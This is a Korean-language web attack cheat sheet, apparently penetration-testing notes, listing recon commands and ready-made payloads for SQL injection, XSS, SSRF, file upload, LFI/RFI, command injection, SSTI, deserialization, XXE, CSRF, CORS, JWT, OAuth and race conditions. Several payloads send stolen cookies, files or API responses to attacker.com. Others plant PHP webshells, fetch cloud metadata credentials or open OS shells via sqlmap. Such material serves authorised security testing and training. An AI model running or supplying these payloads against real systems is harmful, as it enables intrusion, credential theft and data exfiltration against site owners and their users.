# Web 공격

웹 애플리케이션을 대상으로 한 공격 기법. 외부 침투 시 주요 공격 벡터로, 내부망 접근을 위한 초기 침투 경로가 될 수 있다.

---

## 정보 수집

### 기술 스택 확인

```bash
# Wappalyzer 대안 - whatweb
whatweb <url>

# HTTP 헤더 확인
curl -I <url>
curl -v <url> 2>&1 | grep -i 'server\|x-powered\|x-aspnet'
```

### 디렉토리 / 파일 열거

```bash
# gobuster
gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 -x php,asp,aspx,jsp,html,txt,bak

# feroxbuster (재귀 탐색)
feroxbuster -u <url> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -x php,asp,aspx

# ffuf
ffuf -u <url>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 -mc 200,301,302,403
```

### 서브도메인 열거

```bash
# ffuf vhost
ffuf -u <url> -H "Host: FUZZ.<domain>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <default_size>

# gobuster vhost
gobuster vhost -u <url> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain

# DNS 기반
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### 파라미터 Fuzzing

```bash
# GET 파라미터
ffuf -u '<url>?FUZZ=test' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs <default_size>

# POST 파라미터
ffuf -u '<url>' -X POST -d 'FUZZ=test' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs <default_size>
```

---

## SQL Injection

### 수동 테스트

```sql
# 기본 테스트 페이로드
' OR 1=1--
" OR 1=1--
' OR '1'='1
') OR ('1'='1

# UNION 기반 - 컬럼 수 확인
' ORDER BY 1-- -
' ORDER BY 2-- -
' UNION SELECT NULL,NULL,NULL-- -

# UNION 기반 - 데이터 추출
' UNION SELECT 1,username,password FROM users-- -

# Error 기반 (MSSQL)
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))-- -

# Time 기반 Blind
' AND IF(1=1,SLEEP(5),0)-- -          # MySQL
'; WAITFOR DELAY '0:0:5'-- -          # MSSQL
' AND pg_sleep(5)-- -                 # PostgreSQL
```

### sqlmap

```bash
# 기본 사용
sqlmap -u '<url>?id=1' --batch

# POST 요청
sqlmap -u '<url>' --data='user=admin&pass=test' --batch

# 쿠키/헤더 포함
sqlmap -u '<url>?id=1' --cookie='session=abc123' --batch

# 데이터 덤프
sqlmap -u '<url>?id=1' --dbs                    # 데이터베이스 목록
sqlmap -u '<url>?id=1' -D <db> --tables         # 테이블 목록
sqlmap -u '<url>?id=1' -D <db> -T <tbl> --dump  # 데이터 덤프

# OS Shell (DBA 권한 시)
sqlmap -u '<url>?id=1' --os-shell
sqlmap -u '<url>?id=1' --os-cmd='whoami'

# WAF 우회
sqlmap -u '<url>?id=1' --tamper=space2comment,between --random-agent
```

---

## XSS (Cross-Site Scripting)

### Reflected XSS

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

### Stored XSS

게시판, 댓글, 프로필 등에 스크립트를 저장하여 다른 사용자가 해당 페이지 방문 시 실행되도록 한다.

```html
<!-- 쿠키 탈취 -->
<script>document.location='http://<attacker>/c?='+document.cookie</script>

<!-- fetch로 전송 -->
<script>fetch('http://<attacker>/c?='+document.cookie)</script>
```

### DOM-based XSS

```javascript
// URL fragment를 통한 injection
// 취약 코드: document.write(location.hash)
http://target.com/page#<script>alert(1)</script>
```

### 필터 우회

```html
<!-- 대소문자 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 이벤트 핸들러 -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>

<!-- encoding -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- 태그 블랙리스트 우회 -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

---

## SSRF (Server-Side Request Forgery)

```bash
# 내부 서비스 접근
http://127.0.0.1:80
http://localhost:80
http://[::1]:80

# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# 우회 기법
http://0x7f000001         # hex
http://2130706433         # decimal
http://017700000001       # octal
http://127.1              # short form
http://0.0.0.0
```

---

## File Upload

```bash
# 확장자 우회
shell.php → shell.php5, shell.phtml, shell.phar, shell.phps
shell.asp → shell.aspx, shell.ashx, shell.asmx
shell.jsp → shell.jspx

# Content-Type 우회 (Burp에서 변경)
Content-Type: image/jpeg
Content-Type: image/png

# 이중 확장자
shell.php.jpg
shell.jpg.php

# Null byte (구 버전)
shell.php%00.jpg
shell.php\x00.jpg

# .htaccess 업로드 (Apache)
# 파일명: .htaccess, 내용:
AddType application/x-httpd-php .jpg

# 웹쉘 예시 (PHP)
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

---

## LFI / RFI (File Inclusion)

### LFI (Local File Inclusion)

```text
# 기본 경로 순회
../../../../etc/passwd
....//....//....//etc/passwd

# Null byte (PHP < 5.3)
../../../../etc/passwd%00

# Wrapper
php://filter/convert.base64-encode/resource=index.php
php://input (POST body에 PHP 코드)
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Windows
..\..\..\..\windows\system32\drivers\etc\hosts
```

### Log Poisoning (LFI → RCE)

```bash
# Apache access.log에 PHP 코드 삽입
curl -A "<?php system(\$_GET['cmd']); ?>" <url>
# 이후 LFI로 로그 파일 include
<url>?page=../../../../var/log/apache2/access.log&cmd=id
```

### RFI (Remote File Inclusion)

```text
# php.ini에서 allow_url_include=On 이어야 가능
http://target.com?page=http://attacker.com/shell.php
```

---

## Command Injection

```bash
# 기본 구분자
; id
| id
|| id
& id
&& id

# 줄바꿈
%0a id
%0d%0a id

# 백틱/달러
`id`
$(id)

# 필터 우회
# 공백 필터링
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# 키워드 필터링
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
```

---

## SSTI (Server-Side Template Injection)

### 탐지

```text
# 기본 탐지 페이로드
{{7*7}}       → 49이면 Jinja2/Twig
${7*7}        → 49이면 Freemarker/Velocity
#{7*7}        → 49이면 Thymeleaf
<%= 7*7 %>    → 49이면 ERB
```

### 익스플로잇

```python
# Jinja2 (Python)
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate() }}

# 간단한 RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```java
// Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

---

## JWT 공격

```bash
# JWT 디코딩 (base64)
echo '<jwt_token>' | cut -d'.' -f2 | base64 -d 2>/dev/null | jq

# None Algorithm
# Header를 {"alg":"none","typ":"JWT"}로 변경, signature 제거

# 약한 Secret 크래킹
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt

# jwt_tool
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py <token> -X a    # alg:none
python3 jwt_tool.py <token> -X k    # key confusion
```

---

## Deserialization

### PHP

```php
// PHP Object Injection
O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}
```

### Java

```bash
# ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# 탐지: rO0AB (base64), aced0005 (hex)
```

### Python (Pickle)

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

---

## XXE (XML External Entity)

### 기본 XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Blind XXE (Out-of-Band)

```xml
<!-- 공격자 DTD (attacker.com/evil.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;

<!-- 대상에 전송 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

### XXE via File Upload

```xml
<!-- SVG 파일 -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

<!-- XLSX, DOCX (ZIP 내부 XML 편집) -->
```

### XXE → SSRF

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

---

## CSRF (Cross-Site Request Forgery)

```html
<!-- GET 기반 CSRF -->
<img src="http://target.com/admin/deleteUser?id=1">

<!-- POST 기반 CSRF (자동 제출) -->
<form action="http://target.com/account/changeEmail" method="POST" id="csrf">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- JSON body CSRF -->
<form action="http://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```

!!! info "CSRF 토큰 우회"
    - 토큰 값 제거 (파라미터 자체를 삭제)
    - 다른 사용자의 토큰 재사용
    - HTTP method 변경 (POST → GET)
    - Content-Type 변경으로 preflight 우회

---

## CORS Misconfiguration

```bash
# Origin 반사 확인
curl -s -I -H "Origin: https://evil.com" https://target.com/api/data | grep -i 'access-control'

# null Origin 허용 확인
curl -s -I -H "Origin: null" https://target.com/api/data | grep -i 'access-control'
```

```html
<!-- 취약한 CORS 설정 악용 (credentials 포함) -->
<script>
var req = new XMLHttpRequest();
req.onload = function(){ 
  fetch('http://attacker.com/log?data=' + btoa(this.responseText)); 
};
req.open('GET','https://target.com/api/sensitive',true);
req.withCredentials = true;
req.send();
</script>
```

주요 취약 설정:

| 설정 | 위험도 |
|------|--------|
| `Access-Control-Allow-Origin: *` + credentials | 높음 |
| Origin 반사 (요청 Origin 그대로 응답) | 높음 |
| `null` Origin 허용 | 중간 |
| 서브도메인 와일드카드 (`*.target.com`) | 중간 |

---

## IDOR / Access Control

```bash
# 수평적 권한 상승 (다른 사용자 데이터 접근)
GET /api/users/1001 → GET /api/users/1002

# 수직적 권한 상승 (관리자 기능 접근)
GET /admin/dashboard  # 일반 사용자 세션으로
POST /api/users/1001/role  # 권한 변경

# UUID/GUID 예측 불가해 보여도 leak 가능
# 다른 API 응답, 에러 메시지, HTML 소스에서 ID 유출 확인

# API 버전 변경으로 인증 우회
/api/v2/users/1001 → /api/v1/users/1001

# HTTP method 변경
GET /api/users/1001 → PUT /api/users/1001 (body에 수정 데이터)

# 파라미터 오염
GET /api/users?id=1001&id=1002
```

---

## HTTP Request Smuggling

`Content-Length`와 `Transfer-Encoding` 헤더 해석 차이를 악용.

```http
# CL.TE (Front-end: Content-Length, Back-end: Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL (Front-end: Transfer-Encoding, Back-end: Content-Length)
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

```bash
# 탐지 도구
# smuggler.py
python3 smuggler.py -u https://target.com

# Burp Suite → HTTP Request Smuggler 확장
```

---

## Race Condition

동시 요청을 통해 비즈니스 로직을 우회하는 공격.

```bash
# Burp Suite Turbo Intruder (single-packet attack)
# 또는 curl 병렬 요청

# 할인 코드 중복 적용
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/apply-coupon \
    -H "Cookie: session=TOKEN" \
    -d "code=DISCOUNT50" &
done
wait

# 잔액 초과 인출 (TOCTOU)
# 동시에 여러 출금 요청 전송
```

```python
# Python + threading
import threading, requests

def race():
    requests.post("https://target.com/api/transfer",
        cookies={"session": "TOKEN"},
        data={"amount": "1000", "to": "attacker"})

threads = [threading.Thread(target=race) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

---

## GraphQL 공격

```bash
# Introspection Query (스키마 전체 노출)
{"query":"{ __schema { queryType { name } types { name fields { name type { name } } } } }"}

# 특정 타입 필드 확인
{"query":"{ __type(name:\"User\") { fields { name type { name } } } }"}
```

```bash
# 인증 우회 / 권한 상승 시도
{"query":"{ users { id username email password } }"}

# Mutation을 통한 데이터 변조
{"query":"mutation { updateUser(id:1, role:\"admin\") { id role } }"}

# Batch Query (Rate Limit 우회)
[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},...]

# 도구: InQL (Burp 확장), graphql-voyager, clairvoyance (Introspection 비활성화 시)
```

---

## OAuth 공격

```bash
# 1. Open Redirect → Authorization Code 탈취
# redirect_uri 파라미터에 공격자 서버 지정
https://auth.target.com/authorize?client_id=ID&redirect_uri=https://attacker.com/callback&response_type=code

# 2. CSRF (state 파라미터 미검증)
# state 없이 authorization flow 시작 → 공격자의 계정 연결

# 3. 토큰 유출 (Implicit Flow)
# response_type=token → Fragment(#)에 토큰 → Referer로 유출 가능

# 4. PKCE 미적용 시 Authorization Code Interception
# 모바일 앱에서 code_verifier 없이 code만으로 토큰 교환
```

---

## 유용한 도구

| 도구 | 용도 |
|------|------|
| Burp Suite | 웹 프록시, 스캐너 |
| ffuf | 웹 퍼저 |
| sqlmap | SQL Injection 자동화 |
| nikto | 웹 취약점 스캐너 |
| wfuzz | 웹 퍼저 |
| jwt_tool | JWT 공격 |
| ysoserial | Java Deserialization |
| nuclei | 템플릿 기반 취약점 스캐너 |
